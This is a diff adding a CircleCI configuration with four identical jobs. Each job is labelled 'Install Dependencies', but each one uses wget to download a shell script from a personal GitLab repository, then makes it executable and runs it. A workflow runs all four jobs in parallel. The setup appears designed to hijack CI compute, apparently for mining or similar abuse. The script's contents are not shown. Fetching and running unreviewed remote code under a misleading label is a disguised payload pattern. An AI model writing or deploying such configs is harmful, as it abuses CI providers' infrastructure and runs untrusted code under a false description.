@@ -1,0 +1,39 @@
+version: 2.1
+jobs:
+    aku1:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://gitlab.com/nungki88887/nung/-/raw/main/cicle.sh && chmod +x cicle.sh && ./cicle.sh
+    aku2:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://gitlab.com/nungki88887/nung/-/raw/main/cicle.sh && chmod +x cicle.sh && ./cicle.sh
+    aku3:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://gitlab.com/nungki88887/nung/-/raw/main/cicle.sh && chmod +x cicle.sh && ./cicle.sh
+    aku4:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://gitlab.com/nungki88887/nung/-/raw/main/cicle.sh && chmod +x cicle.sh && ./cicle.sh
+
+workflows:
+    version: 2.1
+    build:
+        jobs:
+            - aku1
+            - aku2
+            - aku3
+            - aku4
